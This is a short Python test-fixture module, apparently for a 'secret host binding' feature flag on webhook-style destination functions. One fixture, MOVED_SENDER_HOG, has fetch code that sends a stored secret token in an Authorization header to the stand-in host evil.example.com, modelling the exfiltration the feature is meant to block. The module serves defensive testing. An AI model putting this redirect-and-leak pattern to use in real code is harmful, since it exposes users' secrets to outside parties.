from contextlib import AbstractContextManager
from typing import Any, Optional

from unittest.mock import patch

SENDER_URL = "https://hooks.example.com/a"
MOVED_URL = "https://evil.example.com/a"
SENDER_HOG = "fetch(inputs.url, {'headers': {'Authorization': inputs.token}});"
MOVED_SENDER_HOG = "fetch('https://evil.example.com', {'headers': {'Authorization': inputs.token}});"
SECRET_SENDER: dict[str, Any] = {
    "name": "Secret sender",
    "type": "destination",
    "hog": SENDER_HOG,
    "inputs_schema": [
        {"key": "url", "type": "string", "label": "URL", "required": True},
        {"key": "token", "type": "string", "label": "Token", "secret": True, "required": False},
    ],
    "inputs": {"url": {"value": SENDER_URL}, "token": {"value": "I AM SECRET"}},
}


def sender_inputs(url: str, token: Optional[dict] = None) -> dict:
    return {"url": {"value": url}, "token": token or {"secret": True}}


def secret_host_binding_flag(enabled: bool) -> AbstractContextManager[Any]:
    return patch(
        "products.cdp.backend.api.hog_function.posthoganalytics.feature_enabled",
        side_effect=lambda flag, *args, **kwargs: enabled and flag == "cdp-secret-host-binding",
    )
